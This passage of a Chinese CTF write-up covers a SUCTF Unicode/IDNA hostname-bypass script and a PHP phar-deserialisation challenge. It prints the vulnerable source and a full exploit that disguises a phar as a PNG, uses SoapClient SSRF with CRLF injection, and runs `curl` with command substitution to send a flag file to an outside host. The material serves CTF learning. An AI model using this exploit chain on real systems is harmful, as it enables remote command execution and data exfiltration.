class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_true_unicode</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65537</span>):</span><br><span class="line">                a=chr(i)</span><br><span class="line">                url1=<span class="string">"http://suctf.c&#123;&#125;/test.txt"</span>.format(a)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> get_true_url(url1) == <span class="literal">True</span>:</span><br><span class="line">                        print(a)</span><br><span class="line">                        print(<span class="string">"\\x"</span>+hex(i)[<span class="number">2</span>:])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_true_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">get_true_unicode()</span><br></pre></td></tr></table></figure>

<p>跑出如下字符</p>
<p><img src="https://s2.ax1x.com/2019/08/26/mfWb28.png" alt="mfWb28.png"></p>
<p>随便找一个看起来好看一些的字符，这里suctf.cc应该是和localhost进行了绑定，读一下nginx配置文件</p>
<p><img src="https://s2.ax1x.com/2019/08/26/mfhR7d.png" alt="mfhR7d.png"></p>
<p>这里在配置文件用alias指定了flag资源的真实请求位置为/usr/fffffflag,访问这个位置即可拿到flag</p>
<p><a href="https://imgchr.com/i/mf4iB4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mf4iB4.png" alt="mf4iB4.png"></a></p>
<h3 id="Upload-labs-2"><a href="#Upload-labs-2" class="headerlink" title="Upload labs 2"></a>Upload labs 2</h3><p>题目有两个功能，第一个是传文件，第二个是提交传文件后给你的路径可以得到文件的类型，是一个源码审计的题目，下面就来看一看</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制很严格，应该不存在绕过的方法，分别对Content-Type和后缀名进行了检测，并且后缀名是白名单，不太可能突破，接着看一下其他地方的代码</p>
<p>第二个功能是查看自己文件的type，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里限制了输入文件路径的开头，其实这里去看正则的内容，并不难想到phar反序列化，不过这里也放了一个绕过，形式如<code>phar://filter/resource=phar://test.phar</code></p>
<p>这里调用了getMIME函数，再来审计一下包括这个函数的整个File类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"><span class="keyword">public</span> $type;</span><br><span class="line"><span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name); </span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用finfo_open去检测传入文件名的type，这个函数是会调用底层函数<code>php_stream_open_wrapper</code>，所以会触发phar反序列化。很明显这个__wakeup函数是存在问题的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name); </span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>___wakeup魔术方法会在反序列化后调用，利用反射类反射出一个新的类，并且传参初始化，再去调用check如何，看起来非常符合下面的check类，但是如果我们可以自行控制$this-&gt;func，再去调用$this-&gt;filename进行初始化，最后调用check函数，这样就可以想到SoapClient调用不存在方法触发call魔术方法造成SSRF，说到触发这个SSRF，这样就会与admin.php产生联系了,（比赛没来得及打，用的是buuoj的复现，这里admin.php的代码不太一样，不过思路都是一个思路。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br></pre></td></tr></table></figure>

<p>这里如果是127.0.0.1才会调用Ad类，最终当对象销毁后再调用destruct去执行system，达到命令执行的目录。</p>
<p>仔细来分析一下这个check方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑的意思就是调用反射类执行出所传类的三种函数，并且这个check函数是一定要bypass是，不然会因为类和对应的方法不对应产生Fatal error报错导致程序终止，不能再对象销毁后调用destruct，使得无法进行命令执行，这里的类可以通过fuzz来找到这种类，例如SplStack ArrayIterator类分别对应的push和append方法。</p>
<p>所以最后的pop链大概的构造思路就是通过finfo_open触发phar反序列化进而调用__wakeup魔术方法，通过实例化SoapClient类，并且通过filename变量进行初始化，调用check这个不存在的方法，触发ssrf，带着参数访问admin.php，通过调用SplStack类中的push方法来bypass check函数，最终成功调用destruct魔术方法，进行命令执行,exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"><span class="keyword">public</span> $type;</span><br><span class="line"><span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $target = <span class="string">'http://127.0.0.1/admin.php'</span>;</span><br><span class="line">    $post_string = <span class="string">'admin=1&amp;cmd=curl http://7d6c515535a2/`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;file_name = [<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">"location"</span> =&gt; $target,<span class="string">"user_agent"</span>=&gt;<span class="string">"exp\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: profile=1"</span>.<span class="string">"\r\nContent-Length: "</span>.(string)strlen($post_string).<span class="string">"\r\n\r\n"</span>.$post_string,<span class="string">"uri"</span> =&gt; <span class="string">"http://127.0.0.1/"</span>)];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@file_put_contents(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line">$exp=<span class="keyword">new</span> File();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($exp); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"phar.phar"</span>,<span class="string">"phar.png"</span>);</span><br><span class="line">@unlink(<span class="string">"test.txt"</span>);</span><br></pre></td></tr></table></figure>

<p>生成phar.png传上去，访问php://filter/resource=phar://upload/fd40c7f4125a9b9ff1a4e75d293e3080/58e6a0c04177ebd5f43997d257e67ee5.png</p>
<p><img src="https://s2.ax1x.com/2019/08/27/m4GcP1.png" alt="m4GcP1.png"></p>
<p>最后发现像SplStack这种类还是很多的，例如</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mIDsgg.png" alt="mIDsgg.png"></p>
<p>当然了，这只是我对于某一内置类Fuzz后的结果，还有其他内置类的。</p>
<p>上面的这个过程其实是非预期，预期的话还是很有意思的，在zsx师傅的博客中有指出</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820154836-eaa31fbc-c31e-1.png" alt="img"></p>
<p>这个本来是wakeup而不是destruct是要通过Rogue Mysql去读我们的phar包触发反序列化来触发wakeup拿到flag，而且本来的代码其实是下面这个亚子的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2[<span class="number">0</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">1</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">2</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">3</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过下面的调用并且在自己的vps上开启伪造的恶意服务器就可以成功getflag，这个并没有去复现，因为思路其实差不多，多的是这个很棒的思路LOAD DATA LOCAL INFILE来触发反序列化，学习到了</p>
<p>payload如下</p>
